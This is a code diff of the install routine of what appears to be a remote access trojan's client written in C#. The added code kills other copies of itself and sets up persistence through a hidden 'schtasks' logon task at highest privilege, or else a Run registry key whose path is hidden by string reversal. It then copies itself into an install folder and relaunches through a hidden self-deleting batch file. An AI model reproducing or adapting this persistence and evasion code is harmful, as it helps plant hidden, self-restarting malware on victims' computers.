@@ -1,7 +1,10 @@
-﻿using Microsoft.Win32;
+﻿using Client.Helper;
+using Microsoft.VisualBasic;
+using Microsoft.Win32;
 using System;
 using System.Diagnostics;
 using System.IO;
+using System.Threading;
 
 namespace Client.Install
 {
@@ -11,32 +14,70 @@ namespace Client.Install
         {
             try
             {
-                if (Process.GetCurrentProcess().MainModule.FileName != Settings.ClientFullPath)
+                FileInfo installPath = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile));
+                string currentProcess = Process.GetCurrentProcess().MainModule.FileName;
+                if (currentProcess != installPath.FullName) //check if payload is running from installation path
                 {
-                    foreach (Process P in Process.GetProcesses())
+
+                    foreach (Process P in Process.GetProcesses()) //kill any process which shares same path
                     {
                         try
                         {
-                            if (P.MainModule.FileName == Settings.ClientFullPath)
+                            if (P.MainModule.FileName == installPath.FullName)
                                 P.Kill();
                         }
-                        catch
+                        catch { }
+                    }
+
+                    if (Methods.IsAdmin()) //if payload is runnign as administrator install schtasks
+                    {
+                        Process.Start(new ProcessStartInfo
                         {
-                            Debug.WriteLine("NormalStartup Error : " + P.ProcessName);
+                            FileName = "cmd",
+                            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(installPath.Name) + "\"" + " /tr " + "'" + "\"" + installPath.FullName + "\"" + "' & exit",
+                            WindowStyle = ProcessWindowStyle.Hidden,
+                            CreateNoWindow = true,
+                        });
+                    }
+                    else
+                    {
+                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Strings.StrReverse(@"\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree))
+                        {
+                            key.SetValue(Path.GetFileNameWithoutExtension(installPath.Name), "\"" + installPath.FullName + "\"");
                         }
                     }
 
-                    FileStream Drop;
-                    if (File.Exists(Settings.ClientFullPath))
-                        Drop = new FileStream(Settings.ClientFullPath, FileMode.Create);
-                    else
-                        Drop = new FileStream(Settings.ClientFullPath, FileMode.CreateNew);
-                    byte[] Client = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
-                    Drop.Write(Client, 0, Client.Length);
-                    Drop.Dispose();
+                    FileStream fs;
+                    if (File.Exists(installPath.FullName))
+                    {
+                        File.Delete(installPath.FullName);
+                        Thread.Sleep(1000);
+                    }
+                    fs = new FileStream(installPath.FullName, FileMode.CreateNew);
+                    byte[] clientExe = File.ReadAllBytes(currentProcess);
+                    fs.Write(clientExe, 0, clientExe.Length);
 
-                    Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(Path.GetFileName(Settings.ClientFullPath), Settings.ClientFullPath);
-                    Process.Start(Settings.ClientFullPath);
+                    Methods.ClientOnExit();
+
+                    string batch = Path.GetTempFileName() + ".bat";
+                    using (StreamWriter sw = new StreamWriter(batch))
+                    {
+                        sw.WriteLine("@echo off");
+                        sw.WriteLine("timeout 3 > NUL");
+                        sw.WriteLine("START " + "\"" + "\" " + "\"" + installPath.FullName + "\"");
+                        sw.WriteLine("CD " + Path.GetTempPath());
+                        sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
+                    }
+
+                    Process.Start(new ProcessStartInfo()
+                    {
+                        FileName = batch,
+                        CreateNoWindow = true,
+                        ErrorDialog = false,
+                        UseShellExecute = false,
+                        WindowStyle = ProcessWindowStyle.Hidden
+                    });
+
                     Environment.Exit(0);
                 }
             }
